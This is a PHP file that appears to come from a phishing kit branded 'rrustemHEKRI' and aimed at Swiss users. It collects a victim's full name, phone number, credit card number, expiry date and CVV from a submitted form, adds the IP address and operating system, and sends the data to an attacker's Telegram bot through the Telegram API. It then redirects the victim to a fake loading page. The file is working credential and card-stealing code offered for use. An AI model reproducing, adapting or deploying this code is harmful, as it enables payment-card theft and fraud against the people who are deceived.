<?php
    include '../config.php';
    include "server.php";
    $os = getOS($_SERVER['HTTP_USER_AGENT']); 

    $ip = $_SERVER['REMOTE_ADDR'];
    $message ="
    🇨🇭 Switzerland rrustemHEKRI ----------------
    [IP]    : "."https://www.geodatatool.com/en/?ip=".$ip."
    [ Full name ]      : ".$_POST['name']."
    [ Phone number ]      : ".$_POST['tel']."
    [ Card Number ]      : ".$_POST['cc']."
    [ Exp ]      : ".$_POST['exp']."
    [ Cvv ]      : ".$_POST['cvv']."
    [OS] : ".$os."
    [👨‍💻 Coded] : "."By @rrustemHEKRI_V2"."
    -------- Switzerland rrustemHEKRI  \n";
    function envoiemtn($messaggio,$token,$chatid) {
        $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatid";
        $url = $url . "&text=" . urlencode($messaggio);
        $ch = curl_init();
        $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    
    envoiemtn($message,$token,$chatid);

    header("Location: ../loading.php");
?>